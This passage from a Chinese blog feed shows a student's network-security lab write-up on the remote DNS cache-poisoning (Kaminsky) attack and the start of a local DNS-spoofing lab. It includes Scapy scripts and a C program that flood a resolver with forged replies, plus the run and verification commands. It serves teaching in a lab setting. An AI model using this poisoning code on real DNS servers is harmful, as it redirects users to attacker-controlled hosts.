</span><br><span class="hljs-comment"># same network as the destination. </span><br>srcIP = <span class="hljs-string">&#x27;10.0.2.20&#x27;</span>  <br>dstIP = <span class="hljs-string">&#x27;10.9.0.53&#x27;</span>  <span class="hljs-comment"># Local DNS Server</span><br><br>ip  = IP (dst=dstIP, src=srcIP)<br>udp = UDP(dport=<span class="hljs-number">53</span>, sport=<span class="hljs-number">50945</span>, chksum=<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># The C code will modify the qname field</span><br>Qdsec = DNSQR(qname=<span class="hljs-string">&#x27;aaaaa.example.com&#x27;</span>)<br><br>dns   = DNS(<span class="hljs-built_in">id</span>=<span class="hljs-number">0xAAAA</span>, qr=<span class="hljs-number">0</span>, qdcount=<span class="hljs-number">1</span>, qd=Qdsec)<br><br>pkt = ip/udp/dns<br>send(pkt)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;ip_req.bin&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-built_in">bytes</span>(pkt))<br></code></pre></td></tr></table></figure><p>2、攻击者运行攻击程序：<code>python3 gen_dns_request.py</code>，同时用wireshark抓包，查看效果。从wireshark的抓包结果来看，攻击者构造的数据包被成功发送，并且本地域名服务器也向其他DSN域名服务器发起了DNS请求。</p><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.4.png" class=""><h1>Task 3: Spoof DNS Replies.</h1><p>1、task3实现的是构造欺骗响应包，首先修改攻击代码如下，其中目标IP为本地域名服务器的IP，源IP为指定的IP。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/bin/env python3</span><br><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># The source IP can be any address, because it will be replaced </span><br><span class="hljs-comment"># by the C code with the IP address of example.com&#x27;s actual nameserver. </span><br><span class="hljs-comment"># 源IP可以是任何地址，因为它将被C代码替换为example.com的实际名称服务器的IP地址。</span><br>ip  = IP (dst = <span class="hljs-string">&#x27;10.9.0.53&#x27;</span>, src = <span class="hljs-string">&#x27;1.2.3.4&#x27;</span>)<br><br><span class="hljs-comment"># Set the checksum filed to zero. If this field is not set,</span><br><span class="hljs-comment"># Scapy will calculate checksum for us. Since the UDP packet</span><br><span class="hljs-comment"># will be modified later, this checksum will become invalid. </span><br><span class="hljs-comment"># Setting this field to zero means ignoring checksum (supported by UDP).</span><br><span class="hljs-comment"># Scapy will not do the calculation for us if the field is already set.</span><br><span class="hljs-comment"># 将校验和字段设置为零。如果未设置此字段，Scapy将为我们计算校验和。由于UDP数据包稍后会被修改，所以这个校验和将变得无效。将该字段设置为0意味着忽略校验和(UDP支持)。如果字段已经设置，Scapy将不会为我们进行计算。</span><br>udp = UDP(dport = <span class="hljs-number">33333</span>, sport = <span class="hljs-number">53</span>,  chksum=<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># Construct the Question section</span><br><span class="hljs-comment"># The C code will modify the qname field</span><br>Qdsec  = DNSQR(qname  = <span class="hljs-string">&quot;aaaaa.example.com&quot;</span>)<br><br><span class="hljs-comment"># Construct the Answer section (the answer can be anything)</span><br><span class="hljs-comment"># The C code will modify the rrname field</span><br>Anssec = DNSRR(rrname = <span class="hljs-string">&quot;aaaaa.example.com&quot;</span>,<br>               <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;A&#x27;</span>, <br>               rdata  = <span class="hljs-string">&#x27;1.1.1.1&#x27;</span>, <br>               ttl    = <span class="hljs-number">259200</span>)<br><br><span class="hljs-comment"># Construct the Authority section (the main goal of the attack) </span><br>NSsec  = DNSRR(rrname = <span class="hljs-string">&quot;aaaaa.example.com&quot;</span>, <br>               <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;NS&#x27;</span>, <br>               rdata  = <span class="hljs-string">&#x27;1.2.3.4&#x27;</span>,<br>               ttl    = <span class="hljs-number">259200</span>)<br><br><span class="hljs-comment"># Construct the DNS part </span><br><span class="hljs-comment"># The C code will modify the id field</span><br>dns    = DNS(<span class="hljs-built_in">id</span>  = <span class="hljs-number">0xAAAA</span>, aa=<span class="hljs-number">1</span>, rd=<span class="hljs-number">1</span>, qr=<span class="hljs-number">1</span>, <br>             qdcount = <span class="hljs-number">1</span>, qd = Qdsec,<br>             ancount = <span class="hljs-number">1</span>, an = Anssec, <br>             nscount = <span class="hljs-number">1</span>, ns = NSsec)<br><br><span class="hljs-comment"># Construct the IP packet and save it to a file.</span><br>Replypkt = ip/udp/dns<br>send(Replypkt)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;ip_resp.bin&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-built_in">bytes</span>(Replypkt))<br></code></pre></td></tr></table></figure><p>2、攻击者运行攻击代码，并用wireshark抓包，查看攻击效果。通过wireshark的抓包结果可以看到，欺骗DNS响应包已经成功发送给本地域名服务器。</p><h1>Task 4: Launch the Kaminsky Attack</h1><p>1、使用C语言会比使用python的效率更高，task4将c语言代码和scapy库相结合，实现攻击。在gen_dns_request.py中把srcIP修改为用户IP10.9.0.5，在gen_dns_response.py中把srcIP改为199.43.135.53。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_FILE_SIZE 1000000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SPOOF_PER_REQUEST 100</span><br><br><span class="hljs-comment">// Example.com&#x27;s nameservers</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NS1 <span class="hljs-string">&quot;199.43.133.53&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NS2 <span class="hljs-string">&quot;199.43.135.53&quot;</span></span><br><br><span class="hljs-comment">// Root A and B&#x27;s nameservers</span><br><span class="hljs-comment">//#define NS1 &quot;198.41.0.4&quot;</span><br><span class="hljs-comment">//#define NS2 &quot;192.228.79.201&quot;</span><br><br><br><span class="hljs-comment">/* IP Header */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipheader</span> &#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>      iph_ihl:<span class="hljs-number">4</span>, <span class="hljs-comment">//IP header length</span><br>                     iph_ver:<span class="hljs-number">4</span>; <span class="hljs-comment">//IP version</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>      iph_tos; <span class="hljs-comment">//Type of service</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> iph_len; <span class="hljs-comment">//IP Packet length (data + header)</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> iph_ident; <span class="hljs-comment">//Identification</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> iph_flag:<span class="hljs-number">3</span>, <span class="hljs-comment">//Fragmentation flags</span><br>                     iph_offset:<span class="hljs-number">13</span>; <span class="hljs-comment">//Flags offset</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>      iph_ttl; <span class="hljs-comment">//Time to Live</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>      iph_protocol; <span class="hljs-comment">//Protocol type</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> iph_chksum; <span class="hljs-comment">//IP datagram checksum</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span>  <span class="hljs-title">in_addr</span>    <span class="hljs-title">iph_sourceip</span>;</span> <span class="hljs-comment">//Source IP address </span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span>  <span class="hljs-title">in_addr</span>    <span class="hljs-title">iph_destip</span>;</span>   <span class="hljs-comment">//Destination IP address </span><br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">send_raw_packet</span><span class="hljs-params">(<span class="hljs-type">char</span> * buffer, <span class="hljs-type">int</span> pkt_size)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">send_dns_request</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *, <span class="hljs-type">int</span>, <span class="hljs-type">char</span> *)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">send_dns_response</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *ip_resp, <span class="hljs-type">int</span> n_resp, </span><br><span class="hljs-params">            <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *src_ip, <span class="hljs-type">char</span> * name, </span><br><span class="hljs-params">            <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> transaction_id)</span>; <br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">long</span> i = <span class="hljs-number">0</span>;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> transaction_id = <span class="hljs-number">0</span>;<br><br>  srand(time(<span class="hljs-literal">NULL</span>));<br><br>  <span class="hljs-comment">// Load the DNS request packet from file</span><br>  FILE * f_req = fopen(<span class="hljs-string">&quot;ip_req.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>  <span class="hljs-keyword">if</span> (!f_req) &#123;<br>     perror(<span class="hljs-string">&quot;Can&#x27;t open &#x27;ip_req.bin&#x27;&quot;</span>);<br>     <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ip_req[MAX_FILE_SIZE];<br>  <span class="hljs-type">int</span> n_req = fread(ip_req, <span class="hljs-number">1</span>, MAX_FILE_SIZE, f_req);<br><br>  <span class="hljs-comment">// Load the first DNS response packet from file</span><br>  FILE * f_resp = fopen(<span class="hljs-string">&quot;ip_resp.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>  <span class="hljs-keyword">if</span> (!f_resp) &#123;<br>     perror(<span class="hljs-string">&quot;Can&#x27;t open &#x27;ip_resp.bin&#x27;&quot;</span>);<br>     <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ip_resp[MAX_FILE_SIZE];<br>  <span class="hljs-type">int</span> n_resp = fread(ip_resp, <span class="hljs-number">1</span>, MAX_FILE_SIZE, f_resp);<br><br>  <span class="hljs-type">char</span> a[<span class="hljs-number">26</span>]=<span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-comment">// Generate a random name with length 5 构造长度为5的二级域名</span><br>    <span class="hljs-type">char</span> name[<span class="hljs-number">6</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>; k&lt;<span class="hljs-number">5</span>; k++)  name[k] = a[rand() % <span class="hljs-number">26</span>];<br>    name[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;attempt #%ld. request is [%s.example.com], transaction ID is: [%hu]\</span><br><span class="hljs-string">n&quot;</span>, ++i, name, transaction_id);<br><br>    <span class="hljs-comment">// Step 1. Send a DNS request to the targeted local DNS server</span><br>    send_dns_request(ip_req, n_req, name);<br><br>    <span class="hljs-comment">/* Step 2. Send spoofed responses to the targeted local DNS server.</span><br><span class="hljs-comment">     *         The two IP addresses are example.com&#x27;s actual nameservers. </span><br><span class="hljs-comment">     *         We don&#x27;t know which one is used by the local DNS server, so</span><br><span class="hljs-comment">     *         we spoof the responses from both.    */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SPOOF_PER_REQUEST; j++)&#123;<br>       send_dns_response(ip_resp, n_resp, NS1, name, transaction_id);<br>       send_dns_response(ip_resp, n_resp, NS2, name, transaction_id);<br>       transaction_id = transaction_id + <span class="hljs-number">1</span>;<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">/* The template has a fixed &quot;aaaaa&quot; in the name field; we need </span><br><span class="hljs-comment"> *   to replace it with the actual name randomly generated from </span><br><span class="hljs-comment"> *   the attack. */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">send_dns_request</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *ip_req, <span class="hljs-type">int</span> n_req, <span class="hljs-type">char</span> * name)</span> <br>&#123;<br><br>    <span class="hljs-comment">// Modify the name in the question field (offset=41)</span><br>    <span class="hljs-built_in">memcpy</span>(ip_req+<span class="hljs-number">41</span>, name, <span class="hljs-number">5</span>);<br><br>    <span class="hljs-comment">// Send the IP packet out</span><br>    send_raw_packet(ip_req, n_req);<br>&#125;<br><br><span class="hljs-comment">/* We need to modify several fields in the template, including</span><br><span class="hljs-comment"> *   the source IP address, the two name fields (in question and answer</span><br><span class="hljs-comment"> *   sections), and the transaction ID.  */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">send_dns_response</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *ip_resp, <span class="hljs-type">int</span> n_resp, </span><br><span class="hljs-params">            <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *src_ip, <span class="hljs-type">char</span> * name, </span><br><span class="hljs-params">            <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> transaction_id)</span> <br>&#123;<br>    <span class="hljs-comment">// Modify the src IP in the IP header (offset=12)</span><br>    <span class="hljs-type">int</span> ip = (<span class="hljs-type">int</span>) inet_addr(src_ip);<br>    <span class="hljs-built_in">memcpy</span>(ip_resp+<span class="hljs-number">12</span>, (<span class="hljs-type">void</span> *) &amp;ip, <span class="hljs-number">4</span>);<br><br>    <span class="hljs-comment">// Modify the name in the question field (offset=41)</span><br>    <span class="hljs-built_in">memcpy</span>(ip_resp+<span class="hljs-number">41</span>, name, <span class="hljs-number">5</span>);<br><br>    <span class="hljs-comment">// Modify the name in the answer field (offset=64)</span><br>    <span class="hljs-built_in">memcpy</span>(ip_resp+<span class="hljs-number">64</span>, name, <span class="hljs-number">5</span>);<br><br>    <span class="hljs-comment">// Modify the transaction ID field (offset=28)</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> id[<span class="hljs-number">2</span>];<br>    *id = htons(transaction_id);<br>    <span class="hljs-built_in">memcpy</span>(ip_resp+<span class="hljs-number">28</span>, (<span class="hljs-type">void</span> *) id, <span class="hljs-number">2</span>);<br><br>    <span class="hljs-comment">// Send the IP packet out</span><br>    send_raw_packet(ip_resp, n_resp);<br>&#125;<br><br><br><span class="hljs-comment">/* Send the raw packet out */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">send_raw_packet</span><span class="hljs-params">(<span class="hljs-type">char</span> * buffer, <span class="hljs-type">int</span> pkt_size)</span><br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">dest_info</span>;</span><br>  <span class="hljs-type">int</span> enable = <span class="hljs-number">1</span>;<br><br>  <span class="hljs-comment">// Step 1: Create a raw network socket.</span><br>  <span class="hljs-type">int</span> sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);<br><br>  <span class="hljs-comment">// Step 2: Set socket option.</span><br>  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,<br>             &amp;enable, <span class="hljs-keyword">sizeof</span>(enable));<br><br>  <span class="hljs-comment">// Step 3: Provide needed information about destination.</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipheader</span> *<span class="hljs-title">ip</span> =</span> (<span class="hljs-keyword">struct</span> ipheader *) buffer;<br>  dest_info.sin_family = AF_INET;<br>  dest_info.sin_addr = ip-&gt;iph_destip;<br><br>  <span class="hljs-comment">// Step 4: Send the packet out.</span><br>  sendto(sock, buffer, pkt_size, <span class="hljs-number">0</span>,<br>       (<span class="hljs-keyword">struct</span> sockaddr *)&amp;dest_info, <span class="hljs-keyword">sizeof</span>(dest_info));<br></code></pre></td></tr></table></figure><p>2、打开ip_req.bin，得到域名起始位置的偏移量为0x29，即十进制的41。</p><p>3、打开ip_resp.bin，得到域名其实位置的偏移量为0x40，及十进制的64。</p><p>4、编译运行攻击代码：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">gcc -o remote<span class="hljs-emphasis">_attack remote_attack.c</span><br><span class="hljs-emphasis">./remote_</span>attack<br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.8.jpg" class=""><p>5、在本地域名服务器以下执行命令，检测缓存：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">rndc dumpdb -cache &amp;&amp; <span class="hljs-keyword">grep</span> attacker <span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/bind/</span><span class="hljs-keyword">dump</span>.db<br></code></pre></td></tr></table></figure><p>可能需要等待较长时间才能有攻击效果。</p><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.9.jpg" class=""><h1>Task 5: Result Verifification</h1><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">dig</span> www.example.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.11.jpg" class=""><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">dig</span> aaaaa.example.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.12.jpg" class=""><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dig @ns<span class="hljs-selector-class">.attacker32</span><span class="hljs-selector-class">.com</span> www<span class="hljs-selector-class">.example</span>.com<br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.13.jpg" class=""><p>被攻击的DNS服务器不会使用回复中提供的IP地址，而是会发出一个新的请求亲自查询ns.attacker32.com的真实ip地址， 攻击者必须真正拥有attacker32.com这个域名才有机会回应这个请求，并提供他们选择的IP地址（？）</p>]]></content>
    
    
    <categories>
      
      <category>网络攻防课程实验</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Lab11-DNS欺骗_Local</title>
    <link href="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/"/>
    <url>/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/</url>
    
    <content type="html"><![CDATA[<h1>1 作业题目</h1><p>​本实验的目标是让学生获得对DNS（域名系统）的各种攻击的第一手经验。DNS是互联网的电话簿；它将主机名转换为IP地址，反之亦然。这种转换是通过DNS解析实现的，这种解析发生在幕后。DNS欺骗攻击以各种方式操纵此解析过程，目的是将用户误导到其他目的地，这些目的地通常是恶意的。本实验室主要研究几种DNS欺骗攻击技术。学生将首先设置和配置DNS服务器，然后在实验室环境中的目标上尝试各种DNS欺骗攻击。</p><p>​第一个大实验任务（本地DNS欺骗）中进行的攻击假设攻击者位于同一本地网络上，因此可以嗅探DNS数据包。这个假设是为了简化实验任务。第二个大实验任务为远程DNS攻击实验，攻击者在没有嗅探数据包的情况下发起远程欺骗攻击，远程攻击实验室比本地DNS欺骗实验更具挑战性。</p><p>​实验基于BIND9搭建DNS服务器。Bind是Berkeley Internet Name Domain Service的简写，它是一款实现DNS服务器的开放源码软件。Bind已经成为世界上使用最为广泛的DNS服务器软件，目前Internet上半数以上的DNS服务器都是用Bind来架设的，已经成为DNS中事实上的标准。</p><h1>2 实验步骤</h1><h2 id="2-0-原理">2.0 原理</h2><p><strong>BIND9配置文件</strong></p><p><code>named.conf</code> 配置本地DNS配置表<br><code>named.conf.options</code> 连接外网<br><code>db.local</code> 域名文件模板</p><h3 id="2-0-1-文件配置信息">2.0.1 文件配置信息</h3><p>1、在Linux中，DNS解析器依赖两个文件，分别是/etc/hosts和/etc/resolv.conf。resolv.conf为DNS解析器提供信息，包含本地DNS服务器的IP地址等</p><p>2、dig命令会模拟本地DNS服务器的行为</p><p>3、文件<code>resolve.conf</code>：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nameserver</span> <span class="hljs-number">10.9.0.53</span><br></code></pre></td></tr></table></figure><p>这个文件表明了DNS服务器的IP地址。</p><p>4、文件<code>named.conf</code>，该文件用于建立区域。第一个zone用于进行正向查找（从主机名到IP地址）；第二个区域用来进行反向查找（从IP地址到主机名）。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs abnf">zone <span class="hljs-string">&quot;attacker32.com&quot;</span> &#123;<br>        type master<span class="hljs-comment">;</span><br>        file <span class="hljs-string">&quot;/etc/bind/zone_attacker32.com&quot;</span><span class="hljs-comment">;# 正向查找的区域文件</span><br>&#125;<span class="hljs-comment">;</span><br><br>zone <span class="hljs-string">&quot;example.com&quot;</span> &#123;<br>        type master<span class="hljs-comment">;</span><br>        file <span class="hljs-string">&quot;/etc/bind/zone_example.com&quot;</span><span class="hljs-comment">;</span><br>&#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>type master表示第一步首先去外网DNS服务器查询，如果没有，就用file定义的本地文件，文件名是&quot;/etc/bind/zone_attacker32.com&quot;和&quot;/etc/bind/zone_example.com&quot;</p><p>5、文件<code>named.conf.options</code>：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">options</span>&#123;<br>...<br><span class="hljs-keyword">dump</span>-<span class="hljs-keyword">file</span> <span class="hljs-string">&quot;/var/cache/bind/dump.db&quot;</span>;<br>dnssec-enable no;# DNSSEC的作用是抵御对DNS服务器的欺骗攻击，需关闭<br>query-<span class="hljs-keyword">source</span> port <span class="hljs-number">33333</span>;# 固定端口。出于安全考虑，当发送DNS请求时，BIND <span class="hljs-number">9</span>在它的UDP数据包中使用随机源端口号<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>有很多字段，上面的一个字段表明，将缓存转储到文件&quot;/var/cache/bind/dump.db&quot;中。</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts">sudo rndc dumpdb -cache  <span class="hljs-meta"># cache msg--&gt;<span class="hljs-string">&quot;/var/cache/bind/dump.db&quot;</span></span><br>cat <span class="hljs-keyword">/var/</span>cache<span class="hljs-keyword">/bind/</span>dump.db  <span class="hljs-meta"># view</span><br></code></pre></td></tr></table></figure><p>6、文件<code>zone_attacker32.com</code>，文件的具体格式在RFC 1035中。该文件包括有1个SOA（授权开始）记录，1个NS（域名服务器）记录，4个A（IP地址）记录</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-meta">$TTL</span> <span class="hljs-number">3</span>D<br>@       <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">SOA</span>   ns.attacker32.com. admin.attacker32.com. (<br>                <span class="hljs-number">2008111001</span><br>                <span class="hljs-number">8</span>H<br>                <span 